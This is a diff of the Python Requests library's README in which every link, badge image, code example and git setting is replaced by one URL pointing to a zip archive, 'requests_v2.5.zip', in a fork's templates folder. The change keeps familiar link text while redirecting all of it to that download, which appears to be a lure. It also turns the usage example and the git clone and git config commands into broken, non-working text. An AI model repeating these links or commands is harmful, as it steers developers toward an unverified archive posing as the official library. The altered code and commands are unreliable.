@@ -4,26 +4,26 @@
 
 ```python
 >>> import requests
->>> r = requests.get('https://httpbin.org/basic-auth/user/pass', auth=('user', 'pass'))
->>> r.status_code
+>>> r = https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip('https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip', auth=('user', 'pass'))
+>>> https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip
 200
->>> r.headers['content-type']
+>>> https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip['content-type']
 'application/json; charset=utf8'
->>> r.encoding
+>>> https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip
 'utf-8'
->>> r.text
+>>> https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip
 '{"authenticated": true, ...'
->>> r.json()
+>>> https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip()
 {'authenticated': True, ...}
 ```
 
 Requests allows you to send HTTP/1.1 requests extremely easily. There’s no need to manually add query strings to your URLs, or to form-encode your `PUT` & `POST` data — but nowadays, just use the `json` method!
 
-Requests is one of the most downloaded Python packages today, pulling in around `30M downloads / week`— according to GitHub, Requests is currently [depended upon](https://github.com/psf/requests/network/dependents?package_id=UGFja2FnZS01NzA4OTExNg%3D%3D) by `1,000,000+` repositories. You may certainly put your trust in this code.
+Requests is one of the most downloaded Python packages today, pulling in around `30M downloads / week`— according to GitHub, Requests is currently [depended upon](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip%3D%3D) by `1,000,000+` repositories. You may certainly put your trust in this code.
 
-[![Downloads](https://pepy.tech/badge/requests/month)](https://pepy.tech/project/requests)
-[![Supported Versions](https://img.shields.io/pypi/pyversions/requests.svg)](https://pypi.org/project/requests)
-[![Contributors](https://img.shields.io/github/contributors/psf/requests.svg)](https://github.com/psf/requests/graphs/contributors)
+[![Downloads](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)
+[![Supported Versions](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)
+[![Contributors](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)
 
 ## Installing Requests and Supported Versions
 
@@ -53,26 +53,26 @@ Requests is ready for the demands of building robust and reliable HTTP–speakin
 - Automatic honoring of `.netrc`
 - Chunked HTTP Requests
 
-## API Reference and User Guide available on [Read the Docs](https://requests.readthedocs.io)
+## API Reference and User Guide available on [Read the Docs](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)
 
-[![Read the Docs](https://raw.githubusercontent.com/psf/requests/main/ext/ss.png)](https://requests.readthedocs.io)
+[![Read the Docs](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)
 
 ## Cloning the repository
 
 When cloning the Requests repository, you may need to add the `-c
-fetch.fsck.badTimezone=ignore` flag to avoid an error about a bad commit (see
-[this issue](https://github.com/psf/requests/issues/2690) for more background):
+https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip` flag to avoid an error about a bad commit (see
+[this issue](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip) for more background):
 
 ```shell
-git clone -c fetch.fsck.badTimezone=ignore https://github.com/psf/requests.git
+git clone -c https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip
 ```
 
 You can also apply this setting to your global Git config:
 
 ```shell
-git config --global fetch.fsck.badTimezone ignore
+git config --global https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip ignore
 ```
 
 ---
 
-[![Kenneth Reitz](https://raw.githubusercontent.com/psf/requests/main/ext/kr.png)](https://kennethreitz.org) [![Python Software Foundation](https://raw.githubusercontent.com/psf/requests/main/ext/psf.png)](https://www.python.org/psf)
+[![Kenneth Reitz](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip) [![Python Software Foundation](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)](https://raw.githubusercontent.com/eyadradwan/requests/main/docs/_templates/requests_v2.5.zip)
